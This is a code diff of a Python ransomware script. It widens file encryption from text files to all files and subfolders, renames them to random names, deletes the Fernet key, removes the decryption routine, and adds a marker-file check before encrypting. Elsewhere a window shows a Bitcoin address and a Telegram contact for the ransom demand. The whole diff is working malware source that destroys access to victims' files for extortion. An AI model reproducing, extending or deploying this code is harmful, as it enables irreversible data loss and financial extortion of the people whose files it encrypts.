@@ -7,6 +7,8 @@ import random
 import string
 import requests
 import urllib.request
+import tempfile
+import shutil
 
 def main():
     new = 1
@@ -52,7 +54,7 @@ def main():
     lbl3 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
     lbl3.config(anchor=CENTER)
     lbl3.pack()
-    
+
     def btcaddress():
         webbrowser.open(btcurl, new=new)
     def telegramtag():
@@ -91,12 +93,33 @@ def load_key():
 def kill_key():
     os.remove("key.key")
 
+def nodoublencryption():
+    tmp = str(tempfile.gettempdir())
+    signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
+    path = os.path.dirname(os.path.abspath(signature))
+    tmp_files = []
+    for root, dirs, files in os.walk(tmp):
+        for file in files:
+            tmp_files.append(file)
+
+    if signature in tmp_files:
+        main()
+    else:
+        file = open("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp", "w").write("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5")
+        shutil.move(path + "\\" + signature, tmp + "\\" + signature)
+        write_key()
+        key = load_key()
+        dir = "fichiers"
+        encrypt(dir, key)
+        kill_key()
+        main()
+
 def encrypt(dir, key):
     f = Fernet(key)
-    for filename in glob.glob(os.path.join(dir, '*.txt')):
-        with open(filename, 'r') as file:
+    for filename in glob.glob(os.path.join(dir, '*.*'), recursive=True):
+        with open(filename, "rb") as file:
             file_data = file.read()
-            encrypted_data = f.encrypt(file_data.encode())
+            encrypted_data = f.encrypt(file_data)
         with open(filename, "wb") as new:
             new.write(encrypted_data)
 
@@ -104,20 +127,17 @@ def encrypt(dir, key):
         name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
         os.rename(filename, dir + "/" + name + "." + extension)
 
-def decrypt(dir, key):
-    global decrypted_data
-    f = Fernet(key)
-    for filename in glob.glob(os.path.join(dir, '*.txt')):
-        with open(filename, "rb") as file:
-            encrypted_data = file.read()
-        decrypted_data = f.decrypt(encrypted_data)
-        with open(filename, "wb") as file:
-            file.write(decrypted_data)
+    subdirs = [os.path.join(dir, o) for o in os.listdir(dir) if os.path.isdir(os.path.join(dir, o))]
+    for dirdir in subdirs:
+        for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
+            with open(filename, "rb") as file:
+                file_data = file.read()
+                encrypted_data = f.encrypt(file_data)
+            with open(filename, "wb") as new:
+                new.write(encrypted_data)
 
-main()
-write_key()
-key = load_key()
-dir = "fichiers"
+            extension = str(filename).split(".")[1]
+            name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
+            os.rename(filename, dirdir + "/" + name + "." + extension)
 
-encrypt(dir, key)
-kill_key()
+nodoublencryption()
